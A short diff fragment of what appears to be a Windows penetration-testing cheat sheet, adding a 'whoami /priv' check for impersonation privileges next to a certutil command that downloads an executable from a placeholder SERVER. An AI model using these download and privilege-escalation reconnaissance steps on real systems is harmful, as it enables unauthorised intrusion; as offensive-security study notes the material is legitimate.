@@ -5,6 +5,11 @@ wget for Windows:
 certutil.exe -urlcache -f http://SERVER/FILE.exe OUTFILE.exe
 ```
 
+check for impersonate privs and other privs:
+```
+whoami /priv
+```
+
 Run `dir` recursively:
 ```
 gci -recurse .
